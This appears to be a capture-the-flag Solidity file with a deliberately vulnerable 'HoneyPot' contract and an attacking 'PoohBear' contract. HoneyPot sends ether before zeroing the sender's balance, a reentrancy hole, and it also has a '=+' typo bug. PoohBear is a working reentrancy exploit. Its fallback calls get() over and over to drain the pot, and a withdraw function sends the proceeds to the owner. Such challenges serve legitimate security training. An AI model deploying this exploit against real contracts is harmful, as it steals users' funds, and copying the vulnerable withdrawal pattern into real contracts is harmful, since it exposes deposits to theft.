/**
For HoneyPot Challenge
*/

pragma solidity 0.4.24;

contract HoneyPot {
    mapping (address => uint) public balances;

    event LogPut(address indexed who, uint howMuch);
    event LogGot(address indexed who, uint howMuch);

    constructor() payable public {
        put();
    }

    function put() payable public {
        emit LogPut(msg.sender, msg.value);
        balances[msg.sender] =+ msg.value;
    }

    function get() public {
        emit LogGot(msg.sender, balances[msg.sender]);
        require(msg.sender.call.value(balances[msg.sender])());
        balances[msg.sender] = 0;
    }

    function() private {
        revert();
    }
}

contract PoohBear{
    
    HoneyPot pot;
    address owner;
    // address potOwner = address(0xdD870fA1b7C4700F2BD7f44238821C26f7392148);
    
    event LogId(string id);
    
        
    constructor()
        public
        payable
    {
        owner = msg.sender;
    }
    
    function ()
    external
    payable
    {
        getSteal();
    }
    
    
    function setPotAddr(address potAddr)
    public
    {
        pot = HoneyPot(potAddr);
    }
    
    function put()
    public
    payable
    {
        pot.put.value(5 ether)();
    }
    
    function getSteal()
    public
    payable
    {   

        if (address(pot).balance >= 5 ether){
            // put();
            pot.get();
            emit LogId("Hello! Lubin here :)");
        }
    }
    
    function withdraw()
    public
    {
        require(msg.sender == owner);
        msg.sender.transfer(address(this).balance);
    }
}